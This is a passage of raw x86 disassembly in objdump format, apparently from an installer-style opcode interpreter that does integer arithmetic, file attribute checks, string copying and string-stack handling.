  4016bf:	23 4d e8             	and    -0x18(%ebp),%ecx
  4016c2:	89 0a                	mov    %ecx,(%edx)
  4016c4:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  4016c8:	e9 96 15 00 00       	jmp    0x402c63
  4016cd:	ff 34 95 40 06 47 00 	push   0x470640(,%edx,4)
  4016d4:	e9 79 15 00 00       	jmp    0x402c52
  4016d9:	8b 0d 60 85 46 00    	mov    0x468560,%ecx
  4016df:	8b 35 34 82 40 00    	mov    0x408234,%esi
  4016e5:	85 c9                	test   %ecx,%ecx
  4016e7:	74 07                	je     0x4016f0
  4016e9:	52                   	push   %edx
  4016ea:	51                   	push   %ecx
  4016eb:	ff d6                	call   *%esi
  4016ed:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4016f0:	8b 0d 4c 85 46 00    	mov    0x46854c,%ecx
  4016f6:	85 c9                	test   %ecx,%ecx
  4016f8:	0f 84 5a 15 00 00    	je     0x402c58
  4016fe:	50                   	push   %eax
  4016ff:	51                   	push   %ecx
  401700:	ff d6                	call   *%esi
  401702:	e9 51 15 00 00       	jmp    0x402c58
  401707:	6a f0                	push   $0xfffffff0
  401709:	5e                   	pop    %esi
  40170a:	e8 4d fd ff ff       	call   0x40145c
  40170f:	ff 75 e0             	push   -0x20(%ebp)
  401712:	50                   	push   %eax
  401713:	ff 15 88 80 40 00    	call   *0x408088
  401719:	85 c0                	test   %eax,%eax
  40171b:	0f 85 37 15 00 00    	jne    0x402c58
  401721:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401728:	e9 2b 15 00 00       	jmp    0x402c58
  40172d:	6a f0                	push   $0xfffffff0
  40172f:	5e                   	pop    %esi
  401730:	e8 27 fd ff ff       	call   0x40145c
  401735:	8b d8                	mov    %eax,%ebx
  401737:	53                   	push   %ebx
  401738:	e8 9e 40 00 00       	call   0x4057db
  40173d:	8b f0                	mov    %eax,%esi
  40173f:	85 f6                	test   %esi,%esi
  401741:	74 43                	je     0x401786
  401743:	6a 5c                	push   $0x5c
  401745:	56                   	push   %esi
  401746:	e8 3c 40 00 00       	call   0x405787
  40174b:	8b f0                	mov    %eax,%esi
  40174d:	0f b7 3e             	movzwl (%esi),%edi
  401750:	33 c0                	xor    %eax,%eax
  401752:	50                   	push   %eax
  401753:	53                   	push   %ebx
  401754:	66 89 06             	mov    %ax,(%esi)
  401757:	ff 15 84 80 40 00    	call   *0x408084
  40175d:	85 c0                	test   %eax,%eax
  40175f:	75 1b                	jne    0x40177c
  401761:	ff 15 80 80 40 00    	call   *0x408080
  401767:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40176c:	75 0b                	jne    0x401779
  40176e:	53                   	push   %ebx
  40176f:	ff 15 7c 80 40 00    	call   *0x40807c
  401775:	a8 10                	test   $0x10,%al
  401777:	75 03                	jne    0x40177c
  401779:	ff 45 fc             	incl   -0x4(%ebp)
  40177c:	66 89 3e             	mov    %di,(%esi)
  40177f:	46                   	inc    %esi
  401780:	46                   	inc    %esi
  401781:	66 85 ff             	test   %di,%di
  401784:	75 bd                	jne    0x401743
  401786:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40178a:	74 1e                	je     0x4017aa
  40178c:	6a e6                	push   $0xffffffe6
  40178e:	e8 a2 fc ff ff       	call   0x401435
  401793:	53                   	push   %ebx
  401794:	68 b0 90 4c 00       	push   $0x4c90b0
  401799:	e8 ee 42 00 00       	call   0x405a8c
  40179e:	53                   	push   %ebx
  40179f:	ff 15 78 80 40 00    	call   *0x408078
  4017a5:	e9 ae 14 00 00       	jmp    0x402c58
  4017aa:	6a f5                	push   $0xfffffff5
  4017ac:	e8 84 fc ff ff       	call   0x401435
  4017b1:	e9 a2 14 00 00       	jmp    0x402c58
  4017b6:	33 f6                	xor    %esi,%esi
  4017b8:	e8 9f fc ff ff       	call   0x40145c
  4017bd:	50                   	push   %eax
  4017be:	e8 a9 43 00 00       	call   0x405b6c
  4017c3:	85 c0                	test   %eax,%eax
  4017c5:	0f 84 c5 03 00 00    	je     0x401b90
  4017cb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4017ce:	e9 90 14 00 00       	jmp    0x402c63
  4017d3:	6a d0                	push   $0xffffffd0
  4017d5:	5e                   	pop    %esi
  4017d6:	e8 81 fc ff ff       	call   0x40145c
  4017db:	6a df                	push   $0xffffffdf
  4017dd:	5e                   	pop    %esi
  4017de:	8b f8                	mov    %eax,%edi
  4017e0:	e8 77 fc ff ff       	call   0x40145c
  4017e5:	6a 13                	push   $0x13
  4017e7:	5e                   	pop    %esi
  4017e8:	8b d8                	mov    %eax,%ebx
  4017ea:	e8 6d fc ff ff       	call   0x40145c
  4017ef:	53                   	push   %ebx
  4017f0:	57                   	push   %edi
  4017f1:	ff 15 74 80 40 00    	call   *0x408074
  4017f7:	85 c0                	test   %eax,%eax
  4017f9:	74 04                	je     0x4017ff
  4017fb:	6a e3                	push   $0xffffffe3
  4017fd:	eb ad                	jmp    0x4017ac
  4017ff:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401803:	0f 84 18 ff ff ff    	je     0x401721
  401809:	57                   	push   %edi
  40180a:	e8 5d 43 00 00       	call   0x405b6c
  40180f:	85 c0                	test   %eax,%eax
  401811:	0f 84 0a ff ff ff    	je     0x401721
  401817:	53                   	push   %ebx
  401818:	57                   	push   %edi
  401819:	e8 dc 4c 00 00       	call   0x4064fa
  40181e:	6a e4                	push   $0xffffffe4
  401820:	eb 8a                	jmp    0x4017ac
  401822:	33 f6                	xor    %esi,%esi
  401824:	e8 33 fc ff ff       	call   0x40145c
  401829:	8b f0                	mov    %eax,%esi
  40182b:	8d 45 08             	lea    0x8(%ebp),%eax
  40182e:	50                   	push   %eax
  40182f:	53                   	push   %ebx
  401830:	68 04 20 00 00       	push   $0x2004
  401835:	56                   	push   %esi
  401836:	ff 15 70 80 40 00    	call   *0x408070
  40183c:	85 c0                	test   %eax,%eax
  40183e:	74 25                	je     0x401865
  401840:	8b 45 08             	mov    0x8(%ebp),%eax
  401843:	3b c6                	cmp    %esi,%eax
  401845:	76 2a                	jbe    0x401871
  401847:	66 83 38 00          	cmpw   $0x0,(%eax)
  40184b:	74 24                	je     0x401871
  40184d:	56                   	push   %esi
  40184e:	e8 19 43 00 00       	call   0x405b6c
  401853:	85 c0                	test   %eax,%eax
  401855:	74 0e                	je     0x401865
  401857:	83 c0 2c             	add    $0x2c,%eax
  40185a:	50                   	push   %eax
  40185b:	ff 75 08             	push   0x8(%ebp)
  40185e:	e8 29 42 00 00       	call   0x405a8c
  401863:	eb 0c                	jmp    0x401871
  401865:	33 c0                	xor    %eax,%eax
  401867:	66 89 03             	mov    %ax,(%ebx)
  40186a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401871:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401875:	0f 85 dd 13 00 00    	jne    0x402c58
  40187b:	68 04 20 00 00       	push   $0x2004
  401880:	53                   	push   %ebx
  401881:	53                   	push   %ebx
  401882:	ff 15 6c 80 40 00    	call   *0x40806c
  401888:	e9 cb 13 00 00       	jmp    0x402c58
  40188d:	83 ce ff             	or     $0xffffffff,%esi
  401890:	e8 c7 fb ff ff       	call   0x40145c
  401895:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401898:	51                   	push   %ecx
  401899:	57                   	push   %edi
  40189a:	68 04 20 00 00       	push   $0x2004
  40189f:	6a 00                	push   $0x0
  4018a1:	50                   	push   %eax
  4018a2:	6a 00                	push   $0x0
  4018a4:	ff 15 68 80 40 00    	call   *0x408068
  4018aa:	85 c0                	test   %eax,%eax
  4018ac:	0f 85 a6 13 00 00    	jne    0x402c58
  4018b2:	33 c0                	xor    %eax,%eax
  4018b4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4018bb:	66 89 07             	mov    %ax,(%edi)
  4018be:	e9 95 13 00 00       	jmp    0x402c58
  4018c3:	6a ef                	push   $0xffffffef
  4018c5:	5e                   	pop    %esi
  4018c6:	e8 91 fb ff ff       	call   0x40145c
  4018cb:	50                   	push   %eax
  4018cc:	57                   	push   %edi
  4018cd:	e8 2f 40 00 00       	call   0x405901
  4018d2:	e9 42 fe ff ff       	jmp    0x401719
  4018d7:	6a 31                	push   $0x31
  4018d9:	5e                   	pop    %esi
  4018da:	e8 7d fb ff ff       	call   0x40145c
  4018df:	8b f0                	mov    %eax,%esi
  4018e1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4018e4:	83 e0 07             	and    $0x7,%eax
  4018e7:	56                   	push   %esi
  4018e8:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4018eb:	89 45 08             	mov    %eax,0x8(%ebp)
  4018ee:	e8 b3 3e 00 00       	call   0x4057a6
  4018f3:	56                   	push   %esi
  4018f4:	be a8 a0 40 00       	mov    $0x40a0a8,%esi
  4018f9:	85 c0                	test   %eax,%eax
  4018fb:	74 08                	je     0x401905
  4018fd:	56                   	push   %esi
  4018fe:	e8 89 41 00 00       	call   0x405a8c
  401903:	eb 17                	jmp    0x40191c
  401905:	68 b0 90 4c 00       	push   $0x4c90b0
  40190a:	56                   	push   %esi
  40190b:	e8 7c 41 00 00       	call   0x405a8c
  401910:	50                   	push   %eax
  401911:	e8 a4 46 00 00       	call   0x405fba
  401916:	50                   	push   %eax
  401917:	e8 8c 41 00 00       	call   0x405aa8
  40191c:	56                   	push   %esi
  40191d:	e8 99 41 00 00       	call   0x405abb
  401922:	bf b8 20 41 00       	mov    $0x4120b8,%edi
  401927:	bb 00 10 47 00       	mov    $0x471000,%ebx
  40192c:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  401930:	7c 31                	jl     0x401963
  401932:	56                   	push   %esi
  401933:	e8 34 42 00 00       	call   0x405b6c
  401938:	33 c9                	xor    %ecx,%ecx
  40193a:	85 c0                	test   %eax,%eax
  40193c:	74 10                	je     0x40194e
  40193e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401941:	51                   	push   %ecx
  401942:	83 c0 14             	add    $0x14,%eax
  401945:	50                   	push   %eax
  401946:	ff 15 64 80 40 00    	call   *0x408064
  40194c:	8b c8                	mov    %eax,%ecx
  40194e:	8b 45 08             	mov    0x8(%ebp),%eax
  401951:	83 c0 fd             	add    $0xfffffffd,%eax
  401954:	0d 00 00 00 80       	or     $0x80000000,%eax
  401959:	23 c1                	and    %ecx,%eax
  40195b:	f7 d8                	neg    %eax
  40195d:	1b c0                	sbb    %eax,%eax
  40195f:	40                   	inc    %eax
  401960:	89 45 08             	mov    %eax,0x8(%ebp)
  401963:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401967:	75 06                	jne    0x40196f
  401969:	56                   	push   %esi
  40196a:	e8 43 3f 00 00       	call   0x4058b2
  40196f:	33 c0                	xor    %eax,%eax
  401971:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401975:	0f 95 c0             	setne  %al
  401978:	40                   	inc    %eax
  401979:	50                   	push   %eax
  40197a:	68 00 00 00 40       	push   $0x40000000
  40197f:	56                   	push   %esi
  401980:	e8 4d 3f 00 00       	call   0x4058d2
  401985:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401988:	83 f8 ff             	cmp    $0xffffffff,%eax
  40198b:	75 6b                	jne    0x4019f8
  40198d:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401991:	75 47                	jne    0x4019da
  401993:	53                   	push   %ebx
  401994:	57                   	push   %edi
  401995:	e8 f2 40 00 00       	call   0x405a8c
  40199a:	56                   	push   %esi
  40199b:	53                   	push   %ebx
  40199c:	e8 eb 40 00 00       	call   0x405a8c
  4019a1:	ff 75 f0             	push   -0x10(%ebp)
  4019a4:	68 b0 e0 40 00       	push   $0x40e0b0
  4019a9:	e8 f0 46 00 00       	call   0x40609e
  4019ae:	57                   	push   %edi
  4019af:	53                   	push   %ebx
  4019b0:	e8 d7 40 00 00       	call   0x405a8c
  4019b5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4019b8:	c1 f8 03             	sar    $0x3,%eax
  4019bb:	50                   	push   %eax
  4019bc:	68 b0 e0 40 00       	push   $0x40e0b0
  4019c1:	e8 5b 3d 00 00       	call   0x405721
  4019c6:	83 e8 04             	sub    $0x4,%eax
  4019c9:	0f 84 5d ff ff ff    	je     0x40192c
  4019cf:	48                   	dec    %eax
  4019d0:	74 1b                	je     0x4019ed
  4019d2:	56                   	push   %esi
  4019d3:	6a fa                	push   $0xfffffffa
  4019d5:	e9 26 fc ff ff       	jmp    0x401600
  4019da:	ff 75 f4             	push   -0xc(%ebp)
  4019dd:	6a e2                	push   $0xffffffe2
  4019df:	e8 63 30 00 00       	call   0x404a47
  4019e4:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4019e8:	e9 2e fd ff ff       	jmp    0x40171b
  4019ed:	ff 05 48 06 47 00    	incl   0x470648
  4019f3:	e9 69 12 00 00       	jmp    0x402c61
  4019f8:	ff 75 f4             	push   -0xc(%ebp)
  4019fb:	6a ea                	push   $0xffffffea
  4019fd:	e8 45 30 00 00       	call   0x404a47
  401a02:	ff 05 74 06 47 00    	incl   0x470674
  401a08:	33 ff                	xor    %edi,%edi
  401a0a:	57                   	push   %edi
  401a0b:	57                   	push   %edi
  401a0c:	ff 75 f8             	push   -0x8(%ebp)
  401a0f:	ff 75 e4             	push   -0x1c(%ebp)
  401a12:	e8 d0 14 00 00       	call   0x402ee7
  401a17:	ff 0d 74 06 47 00    	decl   0x470674
  401a1d:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  401a21:	8b d8                	mov    %eax,%ebx
  401a23:	75 06                	jne    0x401a2b
  401a25:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  401a29:	74 0f                	je     0x401a3a
  401a2b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401a2e:	50                   	push   %eax
  401a2f:	57                   	push   %edi
  401a30:	50                   	push   %eax
  401a31:	ff 75 f8             	push   -0x8(%ebp)
  401a34:	ff 15 60 80 40 00    	call   *0x408060
  401a3a:	ff 75 f8             	push   -0x8(%ebp)
  401a3d:	ff 15 bc 80 40 00    	call   *0x4080bc
  401a43:	3b df                	cmp    %edi,%ebx
  401a45:	0f 8d 0d 12 00 00    	jge    0x402c58
  401a4b:	83 fb fe             	cmp    $0xfffffffe,%ebx
  401a4e:	75 13                	jne    0x401a63
  401a50:	6a e9                	push   $0xffffffe9
  401a52:	56                   	push   %esi
  401a53:	e8 46 46 00 00       	call   0x40609e
  401a58:	ff 75 f4             	push   -0xc(%ebp)
  401a5b:	56                   	push   %esi
  401a5c:	e8 47 40 00 00       	call   0x405aa8
  401a61:	eb 08                	jmp    0x401a6b
  401a63:	6a ee                	push   $0xffffffee
  401a65:	56                   	push   %esi
  401a66:	e8 33 46 00 00       	call   0x40609e
  401a6b:	68 10 00 20 00       	push   $0x200010
  401a70:	56                   	push   %esi
  401a71:	e8 ab 3c 00 00       	call   0x405721
  401a76:	e9 8a fb ff ff       	jmp    0x401605
  401a7b:	33 f6                	xor    %esi,%esi
  401a7d:	e8 da f9 ff ff       	call   0x40145c
  401a82:	ff 75 e0             	push   -0x20(%ebp)
  401a85:	50                   	push   %eax
  401a86:	e8 a2 4a 00 00       	call   0x40652d
  401a8b:	e9 c8 11 00 00       	jmp    0x402c58
  401a90:	6a 31                	push   $0x31
  401a92:	5e                   	pop    %esi
  401a93:	e8 c4 f9 ff ff       	call   0x40145c
  401a98:	ff 75 dc             	push   -0x24(%ebp)
  401a9b:	50                   	push   %eax
  401a9c:	e8 80 3c 00 00       	call   0x405721
  401aa1:	85 c0                	test   %eax,%eax
  401aa3:	0f 84 78 fc ff ff    	je     0x401721
  401aa9:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  401aac:	75 08                	jne    0x401ab6
  401aae:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401ab1:	e9 ad 11 00 00       	jmp    0x402c63
  401ab6:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  401ab9:	0f 85 99 11 00 00    	jne    0x402c58
  401abf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401ac2:	e9 9c 11 00 00       	jmp    0x402c63
  401ac7:	6a f0                	push   $0xfffffff0
  401ac9:	5e                   	pop    %esi
  401aca:	eb b1                	jmp    0x401a7d
  401acc:	33 f6                	xor    %esi,%esi
  401ace:	46                   	inc    %esi
  401acf:	e8 88 f9 ff ff       	call   0x40145c
  401ad4:	50                   	push   %eax
  401ad5:	e8 c8 3f 00 00       	call   0x405aa2
  401ada:	e9 72 11 00 00       	jmp    0x402c51
  401adf:	6a 02                	push   $0x2
  401ae1:	59                   	pop    %ecx
  401ae2:	e8 5f f9 ff ff       	call   0x401446
  401ae7:	6a 03                	push   $0x3
  401ae9:	59                   	pop    %ecx
  401aea:	89 45 08             	mov    %eax,0x8(%ebp)
  401aed:	e8 54 f9 ff ff       	call   0x401446
  401af2:	33 f6                	xor    %esi,%esi
  401af4:	46                   	inc    %esi
  401af5:	8b d8                	mov    %eax,%ebx
  401af7:	e8 60 f9 ff ff       	call   0x40145c
  401afc:	8b f0                	mov    %eax,%esi
  401afe:	33 c0                	xor    %eax,%eax
  401b00:	66 89 07             	mov    %ax,(%edi)
  401b03:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  401b06:	74 09                	je     0x401b11
  401b08:	39 45 08             	cmp    %eax,0x8(%ebp)
  401b0b:	0f 84 47 11 00 00    	je     0x402c58
  401b11:	56                   	push   %esi
  401b12:	e8 8b 3f 00 00       	call   0x405aa2
  401b17:	85 db                	test   %ebx,%ebx
  401b19:	7d 08                	jge    0x401b23
  401b1b:	03 d8                	add    %eax,%ebx
  401b1d:	0f 88 35 11 00 00    	js     0x402c58
  401b23:	3b d8                	cmp    %eax,%ebx
  401b25:	7e 02                	jle    0x401b29
  401b27:	8b d8                	mov    %eax,%ebx
  401b29:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  401b2c:	50                   	push   %eax
  401b2d:	57                   	push   %edi
  401b2e:	e8 59 3f 00 00       	call   0x405a8c
  401b33:	8b 75 08             	mov    0x8(%ebp),%esi
  401b36:	85 f6                	test   %esi,%esi
  401b38:	0f 84 1a 11 00 00    	je     0x402c58
  401b3e:	7d 11                	jge    0x401b51
  401b40:	57                   	push   %edi
  401b41:	e8 5c 3f 00 00       	call   0x405aa2
  401b46:	03 f0                	add    %eax,%esi
  401b48:	79 07                	jns    0x401b51
  401b4a:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  401b4e:	8b 75 08             	mov    0x8(%ebp),%esi
  401b51:	81 fe 04 20 00 00    	cmp    $0x2004,%esi
  401b57:	0f 8d fb 10 00 00    	jge    0x402c58
  401b5d:	33 c0                	xor    %eax,%eax
  401b5f:	66 89 04 77          	mov    %ax,(%edi,%esi,2)
  401b63:	e9 f0 10 00 00       	jmp    0x402c58
  401b68:	6a 20                	push   $0x20
  401b6a:	5e                   	pop    %esi
  401b6b:	e8 ec f8 ff ff       	call   0x40145c
  401b70:	6a 31                	push   $0x31
  401b72:	5e                   	pop    %esi
  401b73:	8b f8                	mov    %eax,%edi
  401b75:	e8 e2 f8 ff ff       	call   0x40145c
  401b7a:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401b7e:	50                   	push   %eax
  401b7f:	57                   	push   %edi
  401b80:	75 16                	jne    0x401b98
  401b82:	ff 15 14 81 40 00    	call   *0x408114
  401b88:	85 c0                	test   %eax,%eax
  401b8a:	0f 85 1e ff ff ff    	jne    0x401aae
  401b90:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b93:	e9 cb 10 00 00       	jmp    0x402c63
  401b98:	ff 15 18 81 40 00    	call   *0x408118
  401b9e:	eb e8                	jmp    0x401b88
  401ba0:	33 f6                	xor    %esi,%esi
  401ba2:	46                   	inc    %esi
  401ba3:	e8 b4 f8 ff ff       	call   0x40145c
  401ba8:	68 04 20 00 00       	push   $0x2004
  401bad:	8b d8                	mov    %eax,%ebx
  401baf:	57                   	push   %edi
  401bb0:	53                   	push   %ebx
  401bb1:	ff 15 1c 81 40 00    	call   *0x40811c
  401bb7:	85 c0                	test   %eax,%eax
  401bb9:	74 12                	je     0x401bcd
  401bbb:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401bbf:	74 14                	je     0x401bd5
  401bc1:	57                   	push   %edi
  401bc2:	53                   	push   %ebx
  401bc3:	ff 15 18 81 40 00    	call   *0x408118
  401bc9:	85 c0                	test   %eax,%eax
  401bcb:	75 08                	jne    0x401bd5
  401bcd:	33 c0                	xor    %eax,%eax
  401bcf:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401bd2:	66 89 07             	mov    %ax,(%edi)
  401bd5:	33 c0                	xor    %eax,%eax
  401bd7:	66 89 87 06 40 00 00 	mov    %ax,0x4006(%edi)
  401bde:	e9 75 10 00 00       	jmp    0x402c58
  401be3:	33 c9                	xor    %ecx,%ecx
  401be5:	e8 5c f8 ff ff       	call   0x401446
  401bea:	33 c9                	xor    %ecx,%ecx
  401bec:	41                   	inc    %ecx
  401bed:	8b f0                	mov    %eax,%esi
  401bef:	e8 52 f8 ff ff       	call   0x401446
  401bf4:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  401bf8:	75 12                	jne    0x401c0c
  401bfa:	3b f0                	cmp    %eax,%esi
  401bfc:	0f 8c ac fe ff ff    	jl     0x401aae
  401c02:	7e 8c                	jle    0x401b90
  401c04:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401c07:	e9 57 10 00 00       	jmp    0x402c63
  401c0c:	3b f0                	cmp    %eax,%esi
  401c0e:	0f 82 9a fe ff ff    	jb     0x401aae
  401c14:	0f 86 76 ff ff ff    	jbe    0x401b90
  401c1a:	eb e8                	jmp    0x401c04
  401c1c:	33 db                	xor    %ebx,%ebx
  401c1e:	43                   	inc    %ebx
  401c1f:	8b cb                	mov    %ebx,%ecx
  401c21:	e8 20 f8 ff ff       	call   0x401446
  401c26:	6a 02                	push   $0x2
  401c28:	59                   	pop    %ecx
  401c29:	8b f0                	mov    %eax,%esi
  401c2b:	e8 16 f8 ff ff       	call   0x401446
  401c30:	8b c8                	mov    %eax,%ecx
  401c32:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c35:	83 f8 0c             	cmp    $0xc,%eax
  401c38:	77 66                	ja     0x401ca0
  401c3a:	ff 24 85 80 2d 40 00 	jmp    *0x402d80(,%eax,4)
  401c41:	03 f1                	add    %ecx,%esi
  401c43:	eb 5b                	jmp    0x401ca0
  401c45:	2b f1                	sub    %ecx,%esi
  401c47:	eb 57                	jmp    0x401ca0
  401c49:	0f af ce             	imul   %esi,%ecx
  401c4c:	8b f1                	mov    %ecx,%esi
  401c4e:	eb 50                	jmp    0x401ca0
  401c50:	85 c9                	test   %ecx,%ecx
  401c52:	74 07                	je     0x401c5b
  401c54:	8b c6                	mov    %esi,%eax
  401c56:	99                   	cltd
  401c57:	f7 f9                	idiv   %ecx
  401c59:	eb 1a                	jmp    0x401c75
  401c5b:	33 f6                	xor    %esi,%esi
  401c5d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401c60:	eb 3e                	jmp    0x401ca0
  401c62:	0b f1                	or     %ecx,%esi
  401c64:	eb 3a                	jmp    0x401ca0
  401c66:	23 f1                	and    %ecx,%esi
  401c68:	eb 36                	jmp    0x401ca0
  401c6a:	33 f1                	xor    %ecx,%esi
  401c6c:	eb 32                	jmp    0x401ca0
  401c6e:	33 c0                	xor    %eax,%eax
  401c70:	85 f6                	test   %esi,%esi
  401c72:	0f 94 c0             	sete   %al
  401c75:	8b f0                	mov    %eax,%esi
  401c77:	eb 27                	jmp    0x401ca0
  401c79:	85 f6                	test   %esi,%esi
  401c7b:	75 04                	jne    0x401c81
  401c7d:	85 c9                	test   %ecx,%ecx
  401c7f:	74 08                	je     0x401c89
  401c81:	8b f3                	mov    %ebx,%esi
  401c83:	eb 1b                	jmp    0x401ca0
  401c85:	85 f6                	test   %esi,%esi
  401c87:	75 f4                	jne    0x401c7d
  401c89:	33 f6                	xor    %esi,%esi
  401c8b:	eb 13                	jmp    0x401ca0
  401c8d:	85 c9                	test   %ecx,%ecx
  401c8f:	74 ca                	je     0x401c5b
  401c91:	8b c6                	mov    %esi,%eax
  401c93:	99                   	cltd
  401c94:	f7 f9                	idiv   %ecx
  401c96:	8b f2                	mov    %edx,%esi
  401c98:	eb 06                	jmp    0x401ca0
  401c9a:	d3 e6                	shl    %cl,%esi
  401c9c:	eb 02                	jmp    0x401ca0
  401c9e:	d3 fe                	sar    %cl,%esi
  401ca0:	56                   	push   %esi
  401ca1:	e9 ac 0f 00 00       	jmp    0x402c52
  401ca6:	33 f6                	xor    %esi,%esi
  401ca8:	46                   	inc    %esi
  401ca9:	e8 ae f7 ff ff       	call   0x40145c
  401cae:	6a 02                	push   $0x2
  401cb0:	59                   	pop    %ecx
  401cb1:	8b f0                	mov    %eax,%esi
  401cb3:	e8 8e f7 ff ff       	call   0x401446
  401cb8:	50                   	push   %eax
  401cb9:	56                   	push   %esi
  401cba:	57                   	push   %edi
  401cbb:	ff 15 38 82 40 00    	call   *0x408238
  401cc1:	83 c4 0c             	add    $0xc,%esp
  401cc4:	e9 8f 0f 00 00       	jmp    0x402c58
  401cc9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401ccc:	8b 35 a0 a0 40 00    	mov    0x40a0a0,%esi
  401cd2:	85 c0                	test   %eax,%eax
  401cd4:	74 50                	je     0x401d26
  401cd6:	48                   	dec    %eax
  401cd7:	85 f6                	test   %esi,%esi
  401cd9:	74 0a                	je     0x401ce5
  401cdb:	8b 36                	mov    (%esi),%esi
  401cdd:	85 c0                	test   %eax,%eax
  401cdf:	75 f5                	jne    0x401cd6
  401ce1:	85 f6                	test   %esi,%esi
  401ce3:	75 14                	jne    0x401cf9
  401ce5:	68 10 00 20 00       	push   $0x200010
  401cea:	6a e8                	push   $0xffffffe8
  401cec:	6a 00                	push   $0x0
  401cee:	e8 ab 43 00 00       	call   0x40609e
  401cf3:	50                   	push   %eax
  401cf4:	e9 78 fd ff ff       	jmp    0x401a71
  401cf9:	8d 7e 04             	lea    0x4(%esi),%edi
  401cfc:	57                   	push   %edi
  401cfd:	be a8 a0 40 00       	mov    $0x40a0a8,%esi
  401d02:	56                   	push   %esi
  401d03:	e8 84 3d 00 00       	call   0x405a8c
  401d08:	a1 a0 a0 40 00       	mov    0x40a0a0,%eax
  401d0d:	83 c0 04             	add    $0x4,%eax
  401d10:	50                   	push   %eax
  401d11:	57                   	push   %edi
  401d12:	e8 75 3d 00 00       	call   0x405a8c
  401d17:	a1 a0 a0 40 00       	mov    0x40a0a0,%eax
  401d1c:	56                   	push   %esi
  401d1d:	83 c0 04             	add    $0x4,%eax
  401d20:	50                   	push   %eax
  401d21:	e9 ff 0c 00 00       	jmp    0x402a25
  401d26:	85 d2                	test   %edx,%edx
  401d28:	74 1f                	je     0x401d49
  401d2a:	85 f6                	test   %esi,%esi
  401d2c:	0f 84 ef f9 ff ff    	je     0x401721
  401d32:	8d 46 04             	lea    0x4(%esi),%eax
  401d35:	50                   	push   %eax
  401d36:	57                   	push   %edi
  401d37:	e8 50 3d 00 00       	call   0x405a8c
  401d3c:	8b 06                	mov    (%esi),%eax
  401d3e:	a3 a0 a0 40 00       	mov    %eax,0x40a0a0
  401d43:	56                   	push   %esi
  401d44:	e9 f0 03 00 00       	jmp    0x402139
  401d49:	68 0c 40 00 00       	push   $0x400c
  401d4e:	6a 40                	push   $0x40
  401d50:	ff 15 20 81 40 00    	call   *0x408120
  401d56:	ff 75 dc             	push   -0x24(%ebp)
  401d59:	8b f0                	mov    %eax,%esi
  401d5b:	8d 46 04             	lea    0x4(%esi),%eax
  401d5e:	50                   	push   %eax
  401d5f:	e8 3a 43 00 00       	call   0x40609e
  401d64:	a1 a0 a0 40 00       	mov    0x40a0a0,%eax
  401d69:	89 06                	mov    %eax,(%esi)
  401d6b:	89 35 a0 a0 40 00    	mov    %esi,0x40a0a0
  401d71:	e9 e2 0e 00 00       	jmp    0x402c58
  401d76:	6a 03                	push   $0x3
  401d78:	59                   	pop    %ecx
  401d79:	e8 c8 f6 ff ff       	call   0x401446
  401d7e:	6a 04                	push   $0x4
  401d80:	59                   	pop    %ecx
  401d81:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d84:	e8 bd f6 ff ff       	call   0x401446
  401d89:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401d8d:	89 45 08             	mov    %eax,0x8(%ebp)
  401d90:	74 0b                	je     0x401d9d
  401d92:	6a 33                	push   $0x33
  401d94:	5e                   	pop    %esi
  401d95:	e8 c2 f6 ff ff       	call   0x40145c
  401d9a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d9d:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401da1:	74 0b                	je     0x401dae
  401da3:	6a 44                	push   $0x44
  401da5:	5e                   	pop    %esi
  401da6:	e8 b1 f6 ff ff       	call   0x40145c
  401dab:	89 45 08             	mov    %eax,0x8(%ebp)
  401dae:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401db2:	75 4b                	jne    0x401dff
  401db4:	33 c9                	xor    %ecx,%ecx
  401db6:	41                   	inc    %ecx
  401db7:	e8 8a f6 ff ff       	call   0x401446
  401dbc:	6a 02                	push   $0x2
  401dbe:	59                   	pop    %ecx
  401dbf:	8b f0                	mov    %eax,%esi
  401dc1:	e8 80 f6 ff ff       	call   0x401446
  401dc6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
